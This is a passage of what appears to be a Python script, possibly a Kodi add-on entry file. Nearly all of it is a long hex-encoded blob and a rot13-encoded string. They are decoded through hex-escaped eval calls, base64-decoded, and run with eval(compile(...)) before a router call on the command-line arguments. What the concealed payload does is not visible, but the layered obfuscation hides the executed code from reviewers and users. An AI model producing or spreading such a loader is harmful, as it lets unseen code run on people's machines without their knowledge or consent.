jYzNTc3YTQ3NTY1MDRhNjI3ODQzNjY3MTc5NWE0ODZhNjUzNjYxNzk0ZDJmMzY0NDc3NmE1YTU0NzU2ODQzNDQ2ZTRlMmI1YTM2NzM2ZTU1NDc3MDYzNzA0Yjc1Nzg2ZTQ4NDU2NTc1NDQ1OTZmNGYzNjUxNDYzNDc2NTY3MzJiNmEzOTUzNTk2Njc4MzY3MDZmNjI3YTRkMzE0YzM0NGIzODdhNmQ0MjRiNmY2ODM0NGQ2ZDYxNGIzMjQ3MzQzNTU1Nzg3OTU5NGI3MTQ1N2E0NjUyNGY3ODQ0MzI3MTRiMzk2MTc4NmUzMjUwMzk0MTY2NTU1MTY0Njc3Mjc3NDU2ZTQ1NjEyYjUxNWEzMjY5NmQ0ZTZmMzY1NTMyMzI1MjUwMzA0MjQ0MzQ1MzRkMzM3OTM1NmU2ZDQ4NDY1NjRkNzU2MjQxMzQ1ODM1NzE2MzUwMzU2Yzc5Njk0YzY3NDM3YTcxNDg3NTQzNGY2MzM2Mzk0MjYzMmI0NjJmNmMzODM1NGI0YjUzNGQzNDU3NDk0YjY2NzE2ZjU2MzQ0NTM3NjE2MzQ2Nzg0MzM2NmY2NzU1NzgzOTUyNWEzODQ3NzU2OTRhNzY1NDU4NDI2NjQ0NmU2Yjc4NTY0MTZhNTU1MjM5Nzc2YzUxNGU0ODQ0NTU0MzU4MzY2OTc3NTMzNDdhMzc2ZTQ3NjU1MjZjMzM3ODUwNDg0YTdhNTk2YTMzNGU1Mjc4NzU1OTY3Njc0YzcxNjI3YTM5NTQzMjc3NmMyZjRmNGMyYjY4NDQyYjQ5NmE0YjZiNzQ1MTRkNGE2ZTRiNzk2ODUxNzY0ODQyNmQ0MjU0N2E0OTMxNDI1MjUxNzY3MDY4Nzk3YTQ4MzgyZjc4Njc1ODcwNzg2ZDc1NmQ1MzY5NDM2NTc1MmIzMTQxMzM2ZjMxMzU2NzY5NmE0ODMzNTAzNzRmNjY1NTUyN2E3NzMwNTE2ODc0NTA2YTZmNDU2ZTMyNGU3MTQ5NTM2OTUzNzkzNTZkNzkzOTUwNTE1MDcwNmE3NzZhNzIzNDQyNzE2YTUwNzc2NjZjNTg3OTQ1NmE0OTJmMzA2NzQ5NzE3MzQyNmEzNjc5Njc0NDc4Njg2NzU0NDk0NDUzNmE3ODU0NzU2OTYxNmQ2YzZhNDgzOTQyNmU2YjZkNDE3YTU1NDczNDM5NDMzNDcxNDkyYjY1NmUzMzc4NTU1NDUxNDIzMzRhMzg1OTU2NGIzMjUyNzEzNjZlNzk0NTQxNTU2NDRjNjQ2YjJmNGI0NzUwNzA0NjJiNGI3MDY5NDM3NTRhMzgzOTQ5NzI2YTcwNzA2ZjcwNjc1MzY1NmQ1NjQzNzA1MTY1NGE2YjRiNDM0YTcyMzQ2OTUzNmQ0MjZmNDU3ODc2NmQ2MzM0NzUzNTJmNzQ2MzMxNTA2YzRkNDc1NDY2MzQ3OTQxNTQ3OTQ2NjU3MDUxNmE3Mjc1NWE3NzczMzMzMTQzNmM0ZDY3MzA1NDY0Nzc1MDYxNDU3ODU4NmU0MjM4NmM1NDZmNjY3ODUxNGU0NjQzNjY1ODU1NmIzNDcyNGE3NDQ3NTkyYjcxNjc0ZDJmNTk1MzZmNzQzODY4NDU2Njc1NTg3MjU3NjE2MzJmMzg3ODJmNmM0MzM1MzY0ZDMzNDM1NjRlMzU1NTUxNjYzMjZmNDY2YTUwMzE0Nzc2NmY0MTU1NjMzODZlNjg1MzJmMzU0NDUxNjY0YzYzNDg1MjY4Mzc2YjU3Nzc0YTQ1NGMyYjUwMzM3Mzc4MzA3NzM1NTI1NDJmMzA3ODQ0NjU3NTc3MmI1OTM4NzU0ZjU1NmE1MTZhNmU3OTQyNzU1NTc2Nzg0Zjc4NzA0ZjY1NjQzMTU1NDk3NzU5NmEzODc5NWE2NzZmNjIzNjUwMzk0ZTZlMmY3NzUxNmM2YzM0MmI1MTdhNTQ2YTQ0MmI0ZDU2MzU2OTQ3Nzg0YjY2NmQ1MDZjNDUzMTRlNTI0MzYzNzQ0ZjZmNTA2YzRlNTQ0MTQ1NjU2ZDRlNTk0ZjUzNmE0YzY5NmQ1MzZjMzQyYjU5Nzc3Njc4NjEyZjM2NDE0ODRjNDQ1MjMwNzYzMDU2NTg3OTZiNjg2ZTRkNDk1NTMyNTU3ODU2Mzk1NDcwNjM3YTMzNGEzOTUzNzI1Njc2NTk3MDdhNDE0NzZmNGQzOTRmMmI2ZjZiMzI2MTRiMzc0MTYxNTU1ODY4Nzc0MjM1NDM0ZTc4NzE0NzRlNzg1MDJmMzczMjQ4MmY0ZTUyNGY0ZTUyMzMzMzQ0Mzg3MzJiNTM2NzRjMzk3OTRmNjc2NDZlNDU2NjdhNTAzMzU5NTQ0YzZiMmY3YTYyNTU2ZDM2NzQzODRhMzgzMTY0NGQ3MTY1NjEzNjZhNDM2ZTM5NjU0MTM1MmI2ODQ4Nzc1MjdhNmU0OTc3MzM1MTM0Nzg3MTZlNTM2ZDc3NzY0NTUyNDI3ODc5Mzk0YjU3NjUzODRkNGY3OTVhNzE2YzZhNzgzMDUyMmY1Nzc4NjEyZjc2NmQ1NTZmMzIzMjMzNDc2ODZkNDk3MTRiMzkzNDUwNjk1Mjc2MzA0MTM4NDk3NTcwNjI2Yjc4NzgzMTVhNmE0MzQ0NGM3OTMxMzU1MDU0NmU2YjUxNzY0ZjZiMzY2NTM1NDQ2OTMyNDEzNjJiNmEyZjc3NzA2ZDUzN2E2YjYzNTAzNTcxNGU0ZjMzNDg2Mzc5NTY1YTRmNTA3NjcxNDM2NjRkNTQ2YTUwNjM2YzMyNDMyZjY4NmU3ODY4Mzc3ODRmMzgzNjc1NjU0NjQ1NzcyYjMzNmI2ODdhNjMzNTQ3NDg0ZDM0MzY1MDJiNTk2NzUxNzI3YTJmNmY2YTUwNjQ0ZDU1NTU1MDM5NjczMzM2NTk2YTM4NDQ0ZTM5NjY2ZTQ1NmM0NTM1MzkzNzc0Mzk1MTM1MmI0NDZmNDI0YjY4MzEzNjQ3NzU2ODQ4Mzk1MTcyMzY2YjZjNDI3ODRlNDU0Nzc4NGE3NTYxMzYzMjYzMmI3MzczNGUzNDRkNDg0NjJiMzQ2MTRmNmQ2MzMxMmY1MDY2NjUzNzMwNzI0MTJmNjQ2MzUwNjE1NDc3NzAzNjcwNjU0MjU4NmQ0MzM4NzAzNTJiNWE1MjZhNzgzMDY2NjQ0ZDRiMzg1NDM0NmU1ODQzNjU2ODQ4NTc0MTdhNDE3NjcyNDU0ZTY3NTA1MTU2NTUzNTQ4N2E0ZjY4MzM3NzU1NmE1OTM4NGI2ZDc2NGY1MjRkNzQ1MjZkMzY0NzY0NDI3NjU1NjI2Njc5NmU3MjUzNWE3MDZmNzYzOTUwNjczODcxNzM3NDJiNmM3ODZjN2E2NjU5NDQzNDdhNGY2MjM0NTI0YTM4MmIzODY0NDUyYjM4Njc3Njc5NDUzNDRmNTA3OTZlNGI2NDRmNzQ2NDMyMzQ1ODc5NDU2NzQ4MzA0ZDY2NTIzNTc3NmU1MDQ1NTYzOTY1NjE1NjZhMzY0YzRmMmY2Njc2NDUyYjU3Mzk2NTM1MmI0NzZhNTk2MTY1NDU2YTM5Mzc0ZjY0NTM0ZjRmNGI3NjRjNTI0YTRmNTIzN'
keymaker = 'GZ5ATL2AQquZmZmAwWzAzD0MwplATZ2MGL2AzH1ZwL1AGVmBGD3AGx3BGMxAzD2AQL1AQtmZGMuZmp2AmEzAJR1BGpkAzZ3BQD4Zmt3BQD4AGx3LGEvAmZ3AGWvAQH0BGZjAwp2AwMyAQD3AGHlAGt3ZQpjZmp2BGL1Zmt1AwD4AGH2BQH2AGD2MGD2AQtlMwL3ZmD3ZwZ0AGt0ZGZ4AQD3Zwp1AQp2MwDlAmtmBQHlAGRmAmZmATD1ZwZ2ATZ2MQMzA2R2BQLmATZmZQDlAmH0BQD4ZmN0ZwMyAmH0LmMzATR1BQD5AGtmAQMyAQD0BQD2AGN0AQZ1AmR0ZGplAmR0MwD3AQRmAmplZmH0MwDkZmt2LwZmZmZ2AmLlAmR3ZQIuAzRmZwZ0ZmD2AQquZmZ1AwH1Amx1Awp4AGt1ZQMzZmHmZmHlAwH1ZwZlAQL2ZGEuATL3ZQMuAmV2Lmp1AwH1Zwp5AzR1ZGHlAmx0LwMuZmt1AQplAGV3AmHjZmN1AGp5ZmZmZQp5AwH0AQZlAzV0ZGExZmL3BGp2A2RmZmp4AwZ1AwZ0AzH1ZGLlZmV0ZwD5Amp1AmL3AwV0AwD5AwHlMwp1AGNmZmZmZmt3ZwEwAGp0LGZmATZ3BGp3ATH3ZwMwAGx3AGZjZzV2LGHkAQZ3ZwDkAwHmAmZ0AQH2BGDlAmLmZwHmAQV0BGZ5AwR0LGDlAQV3AmL5AwZ0ZmH0AQV0MGHkAGZmZmEwZmL0AQZ3AmV0AGpkAQR2MQp4AGRmZwpjAwR2LGDkAQL2ZwHkATDmAGMwAQZ0AwZ0AQH0ZwZ1AwH0LwZ0AQt3ZQZjAwD1AGZ0AGNmAwDlZmDmAQLmZmRmAQD1Zmx3AmplAwL1ZmZjZmV3ZQp1Zmt1ZQp1AmD2BGZ3AGL1AwZlA2R0BGD1ATZ3AwHmAGHmAQHmAmp0BGLmAmRlLwMzAGD2MGD1AQx2AQH4AQDmAmD2ZmZ0AQH3ZmL3Zwp3ZzL0ZGEyAwD1ZGD2AmH0BQLmATRmZGMzA2R1AQL1AGZmZwZ1AQR2MwL2AGZ2MwWzAmL0ZwEvAGR3BGp3AGV2MQZlAQx0ZmMwAmt0LGL5Zmp2LmH5AQR3AQp3Amx2ZmD0AzH2AQIuAwp2MQp1AGLlLwpjZmLmBGD5AzVmZGH5AmN0LmEwZzL1LGp5ZmH1AGEzAQD1AmH5AwRmZQLmAzH0M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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
if __name__ == '__main__':
    router(sys.argv[2][1:])
